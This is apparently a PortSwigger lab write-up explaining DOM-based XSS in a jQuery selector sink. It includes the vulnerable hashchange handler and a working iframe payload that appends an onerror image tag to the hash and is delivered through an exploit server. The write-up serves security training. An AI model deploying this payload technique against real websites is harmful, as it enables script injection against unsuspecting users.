# DOM XSS in jQuery selector sink using a hashchange event

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event), you'll learn: DOM XSS in jQuery selector sink using a hashchange event! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-6/images/Pasted%20image%2020221229061609.png)

**View source page:**
```html
<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

In here, we can see that **it uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-6/images/Pasted%20image%2020221229062028.png)

Now, since the `location.hash` is controlled by the user, we can try to exploit that.

To do so, we need to trigger the `hashchange` event handler without user interaction.

**For example, we can use an `<iframe>`:**
```html
<iframe src="https://0af4007404af60e5c17e12d500bb0047.web-security-academy.net/#" onload="this.src+='<img src=errorpls onerror=print()>'">
```

In here, the `iframe`'s `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS payload is appended to the hash, causing the `hashchange` event to fire.

**Let's use the exploit server to host the payload and deliver to the victim:**
```html
<html>
    <head>
        <title>XSS-6</title>
    </head>
    <body>
        <iframe src="https://0af4007404af60e5c17e12d500bb0047.web-security-academy.net/#" onload="this.src+='<img src=errorpls onerror=print()>'">
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-6/images/Pasted%20image%2020221229062830.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-6/images/Pasted%20image%2020221229062937.png)

We did it!

# What we've learned:

1. DOM XSS in jQuery selector sink using a hashchange event